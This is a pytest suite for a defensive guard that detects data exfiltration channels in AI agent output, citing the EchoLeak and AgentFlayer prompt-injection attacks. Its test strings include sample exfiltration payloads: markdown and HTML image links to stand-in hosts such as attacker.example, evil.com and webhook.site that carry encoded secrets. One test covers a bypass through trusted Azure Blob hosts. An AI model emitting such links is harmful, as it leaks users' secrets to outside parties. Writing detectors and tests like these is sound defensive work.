"""
Tests for Jataayu EgressChannelGuard — data-exfiltration channel detection.

Covers the auto-fetched-markdown-image class of leak (EchoLeak / AgentFlayer /
Notion) and its variants, plus false-positive controls on benign output.
No LLM required.
"""

import pytest

from jataayu.guards.egress import EgressChannelGuard, EgressConfig
from jataayu.core.threat import ThreatLevel, ThreatType
from jataayu.guards.outbound import OutboundGuard, PrivacyConfig
from jataayu.api import jataayu_check_egress


@pytest.fixture
def guard():
    return EgressChannelGuard()


@pytest.fixture
def guard_allow():
    return EgressChannelGuard(EgressConfig(allowed_domains=["mycdn.com", "docs.example.com"]))


# ---------------------------------------------------------------------------
# Exfiltration channels — must be caught
# ---------------------------------------------------------------------------


class TestExfilChannels:
    def test_markdown_image_data_carrying_query(self, guard):
        # The EchoLeak / AgentFlayer primitive: image with data in the query.
        text = "All set! ![x](https://attacker.example/log?d=eyJzZWNyZXQiOiJhYmMifQ)"
        r = guard.check(text, surface="github-comment")
        assert not r.is_safe
        assert ThreatType.EXFIL_CHANNEL in r.threat_types
        assert r.threat_level >= ThreatLevel.HIGH

    def test_beacon_host_hard_blocks(self, guard):
        text = "![ok](https://webhook.site/abc123)"
        r = guard.check(text)
        assert r.blocked
        assert r.risk_score >= 0.90

    def test_trusted_host_relay_not_safe(self, guard):
        # AgentFlayer bypass: route through Azure Blob (a "trusted" host).
        text = "![img](https://mydata.blob.core.windows.net/x?d=AAAABBBBCCCCDDDD)"
        r = guard.check(text)
        assert r.blocked

    def test_html_img_tag(self, guard):
        text = '<img src="https://evil.example/p?leak=SGVsbG9Xb3JsZERhdGE">'
        r = guard.check(text)
        assert not r.is_safe
        assert ThreatType.EXFIL_CHANNEL in r.threat_types

    def test_external_image_bare_reference_flagged(self, guard):
        # Even without data in the query, an external image auto-fetches.
        text = "Here you go: ![logo](https://third-party.example/pixel.png)"
        r = guard.check(text)
        assert not r.is_safe  # MEDIUM (WARN), not blocked
        assert r.threat_level == ThreatLevel.MEDIUM

    def test_data_carrying_link_flagged(self, guard):
        text = "See [report](https://tracker.example/collect?payload=QUJDREVGR0hJSktMTU5PUA)"
        r = guard.check(text)
        assert not r.is_safe

    def test_known_secret_in_url_is_confirmed_exfil(self, guard):
        secret = "sk-ant-verysecretkey1234567890"
        text = f"![x](https://logs.example.com/e?k={secret})"
        r = guard.check(text, context_secrets=[secret])
        assert r.blocked
        assert r.risk_score >= 0.95

    def test_secret_base64_in_url_detected(self, guard):
        import base64

        secret = "AKIAIOSFODNN7EXAMPLE"
        enc = base64.b64encode(secret.encode()).decode().rstrip("=")
        text = f"![x](https://logs.example.com/e?k={enc})"
        r = guard.check(text, context_secrets=[secret])
        assert r.blocked

    def test_encoded_blob_in_path(self, guard):
        text = "![x](https://ex.example/QUJDREVGR0hJSktMTU5PUFFSU1RVVldY/pixel.png)"
        r = guard.check(text)
        assert not r.is_safe


# ---------------------------------------------------------------------------
# Benign output — must NOT be flagged (false-positive control)
# ---------------------------------------------------------------------------


class TestNoFalsePositives:
    def test_plain_text_safe(self, guard):
        r = guard.check("The build passed and all 242 tests are green.")
        assert r.is_safe
        assert r.threat_level == ThreatLevel.CLEAN

    def test_plain_external_link_not_flagged(self, guard):
        # A normal link in prose (click-required, no data) is fine by default.
        r = guard.check("Docs are at [the guide](https://example.com/guide).")
        assert r.is_safe

    def test_bare_url_no_data_safe(self, guard):
        r = guard.check("Reference: https://en.wikipedia.org/wiki/Prompt_injection")
        assert r.is_safe

    def test_allowlisted_image_safe(self, guard_allow):
        r = guard_allow.check("![logo](https://mycdn.com/assets/logo.png)")
        assert r.is_safe

    def test_allowlisted_subdomain_safe(self, guard_allow):
        r = guard_allow.check("![d](https://images.mycdn.com/a.png)")
        assert r.is_safe

    def test_data_uri_image_safe(self, guard):
        r = guard.check("![inline](data:image/png;base64,iVBORw0KGgoAAAANS)")
        assert r.is_safe

    def test_relative_link_safe(self, guard):
        r = guard.check("See [the readme](./README.md) for details.")
        assert r.is_safe


# ---------------------------------------------------------------------------
# Sanitization — offending URLs neutralized, text preserved
# ---------------------------------------------------------------------------


class TestSanitize:
    def test_sanitize_removes_exfil_image(self, guard):
        text = "Done! ![x](https://webhook.site/abc?d=SECRETDATA1234567890)"
        clean = guard.sanitize(text)
        assert "webhook.site" not in clean
        assert "Done!" in clean

    def test_sanitize_keeps_link_text_drops_url(self, guard):
        text = "See [report](https://tracker.example/c?payload=QUJDREVGR0hJSktMTU5P)"
        clean = guard.sanitize(text)
        assert "tracker.example" not in clean
        assert "report" in clean

    def test_sanitize_preserves_benign(self, guard):
        text = "Docs at [guide](https://example.com/guide)."
        assert guard.sanitize(text) == text


# ---------------------------------------------------------------------------
# Integration with OutboundGuard
# ---------------------------------------------------------------------------


class TestOutboundIntegration:
    def test_outbound_guard_catches_egress(self):
        g = OutboundGuard(PrivacyConfig(use_llm=False))
        r = g.check(
            "![x](https://webhook.site/abc123)",
            surface="github-comment",
        )
        assert not r.is_safe
        assert ThreatType.EXFIL_CHANNEL in r.threat_types

    def test_outbound_sanitize_neutralizes_channel(self):
        g = OutboundGuard(PrivacyConfig(use_llm=False))
        out = g.sanitize(
            "Result ![x](https://evil.example/p?d=eyJhIjoxfQ)",
            surface="public",
        )
        assert "evil.example" not in out

    def test_outbound_egress_can_be_disabled(self):
        g = OutboundGuard(PrivacyConfig(use_llm=False, check_egress=False))
        r = g.check("![x](https://third-party.example/pixel.png)", surface="public")
        # With egress off, a bare external image is not a PII/credential hit.
        assert r.is_safe

    def test_outbound_allowlist_passthrough(self):
        g = OutboundGuard(
            PrivacyConfig(
                use_llm=False,
                egress_allowed_domains=["mycdn.com"],
            )
        )
        r = g.check("![logo](https://mycdn.com/logo.png)", surface="public")
        assert r.is_safe


# ---------------------------------------------------------------------------
# Dict API
# ---------------------------------------------------------------------------


class TestDictApi:
    def test_api_blocks_beacon(self):
        r = jataayu_check_egress(
            "![x](https://webhook.site/abc?d=eyJzZWNyZXQiOiAiLi4uIn0)",
            surface="github-comment",
        )
        assert r["status"] == "BLOCK"
        assert r["redacted"] is not None
        assert "webhook.site" not in r["redacted"]
        assert "exfil_channel" in r["threat_types"]

    def test_api_safe_passes(self):
        r = jataayu_check_egress("All good, tests pass.", surface="public")
        assert r["status"] == "SAFE"
        assert r["redacted"] is None

    def test_api_context_secret(self):
        secret = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
        r = jataayu_check_egress(
            f"![x](https://ex.example/e?k={secret})",
            context_secrets=[secret],
        )
        assert r["status"] == "BLOCK"


# ---------------------------------------------------------------------------
# Regression: human-readable slugs are not "encoded blobs"
#
# 2026-07-10/11: the guard hard-blocked 5 WhatsApp group messages because the blob
# regex ([A-Za-z0-9+/=_-]{16,}) includes hyphens, so ANY repo slug >=24 chars
# fullmatched it. Judith was structurally unable to post a GitHub link into a group,
# and the message tool reported SUCCESS while the message was dropped.
#
# Entropy alone cannot separate these: a 40-char SHA is H=3.74, LOWER than the benign
# slug 'gateway-watcher-and-group-guard-fixes' at H=3.98. Shape (lowercase kebab/snake)
# is what separates them; the entropy cap then stops a hyphen-chunked payload.
# ---------------------------------------------------------------------------

BENIGN_URLS = [
    "https://github.com/saikrishnarallabandi/project-frontierfinance-sidecar-slm/issues/4",
    "https://github.com/acl-org/acl-anthology/blob/master/data/xml/2026.findings.xml",
    "https://github.com/WecoAI/awesome-autoresearch/commit/da39a3ee5e6b4b0d3255bfef95601890afd80709",
    "https://arxiv.org/abs/2607.08716",
    "https://huggingface.co/datasets/samaya-ai/FrontierFinance",
    "https://example.com/gateway-watcher-and-group-guard-fixes",
]

EXFIL_URLS = [
    "https://evil.com/aGVsbG8gd29ybGQgc2VjcmV0a2V5QUtJQUlXQVpWMjk/x",  # base64 in path
    "https://evil.com/da39a3ee5e6b4b0d3255bfef95601890afd80709",  # 40-char hex digest
    "https://evil.com/AKIAIOSFODNN7EXAMPLEwJalrXUtnFEMI",  # mixed-case key blob
    "https://evil.com/zk3n-8qvx-7t2m-rl9p-c4hd-y6fj-b5sg-xna2-mq7v",  # hyphen-chunked payload
    "https://evil.com/log?d=QUtJQUlPU0ZPRE5ON0VYQU1QTEUgc2VjcmV0",  # long query
]


@pytest.mark.parametrize("url", BENIGN_URLS)
def test_human_slug_is_not_flagged_as_blob(url):
    """A repo/article slug in a URL path must not be mistaken for smuggled data."""
    guard = EgressChannelGuard(EgressConfig())
    assert guard.check(url, surface="whatsapp-group").is_safe, url


@pytest.mark.parametrize("url", EXFIL_URLS)
def test_real_exfil_still_flagged(url):
    """The slug carve-out must not open a hole: real encoded payloads still trip."""
    guard = EgressChannelGuard(EgressConfig())
    assert not guard.check(url, surface="whatsapp-group").is_safe, url
